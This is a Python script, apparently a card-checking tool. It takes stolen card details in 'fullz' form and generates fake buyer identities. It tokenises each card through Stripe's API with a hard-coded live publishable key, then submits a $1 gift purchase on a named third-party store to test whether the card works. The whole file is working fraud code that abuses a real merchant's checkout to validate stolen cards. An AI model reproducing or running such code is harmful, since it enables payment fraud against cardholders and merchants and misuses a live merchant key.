import asyncio
import httpx
from fake_useragent import UserAgent
import random 
from FUNC.defs import *
import uuid
def find_between(s, start, end):
    try:
        return (s.split(start))[1].split(end)[0]
    except IndexError:
        return ""


async def create_cvv_charge(fullz , session):
    cc , mes , ano , cvv = fullz.split("|")
    random_data = await get_random_info(session)
    fname = random_data["fname"]
    lname = random_data["lname"]
    email                = random_data["email"]
    phone                = random_data["phone"]
    add1                 = random_data["add1"]
    city                 = random_data["city"]
    state                = random_data["state"]
    state_short          = random_data["state_short"]
    zip_code             = random_data["zip"]

    url="https://api.stripe.com/v1/tokens"
    data = {
    "time_on_page": random.randint(1, 99999),  # Fix here
    "pasted_fields": "number",
    'guid': str(uuid.uuid4()),
    'muid': str(uuid.uuid4()),
    'sid': str(uuid.uuid4()),
    "key": "pk_live_CQCJt113nBqBl1xwzAFQwjhG",
    "payment_user_agent": "stripe.js/78ef418",
    "card[name]": fname,
    "card[number]": cc,
    "card[exp_month]":mes,
    "card[exp_year]": ano,
    "card[cvc]": cvv,
}
    response=await session.post(url=url,data=data)
    #print(response.text)
    token_id_start = response.text.find('"id": "') + len('"id": "')
    token_id_end = response.text.find('"', token_id_start)
    token_id = response.text[token_id_start:token_id_end]
    print(f'Token ID: {token_id}')
    await asyncio.sleep(0.5)
    response = await session.get("https://www.digitaladventures.com/purchase-gift")
    authenticity_token = find_between(response.text, 'name="authenticity_token" value="', '"')
    print(f'Authenticity Token: {authenticity_token}')
    await asyncio.sleep(0.5)  
    url="https://www.digitaladventures.com/gifts"
    data = {
    'utf8': '✓',
    'authenticity_token': authenticity_token,
    'gift[product]': 'Custom Amount',
    'gift[amount]': '1',
    'gift[gifter_first_name]': fname,
    'gift[gifter_last_name]': lname,
    'gift[gifter_email]': email,
    'gift[gifter_phone]': phone,
    'gift[giftee_first_name]': fname,
    'gift[giftee_last_name]': lname,
    'gift[giftee_email]': '',
    'gift[physical]': '',
    'gift[giftee_address_1]': '',
    'gift[giftee_address_2]': '',
    'gift[giftee_zip]': '',
    'gift[giftee_message]': '',
    'gift[note]': '',
    'stripeToken': token_id,
}
    result=await session.post(url=url,data=data)
    await asyncio.sleep(0.5)  
    #print(response.text)
    alert_div_start = result.text.find('<div class="alert alert-danger alert-dismissible" role="alert">')
    alert_div_end = result.text.find('</div>', alert_div_start)
    alert_div_content = result.text[alert_div_start:alert_div_end + len('</div>')]
    print(f'{alert_div_content}')
    return result
        
        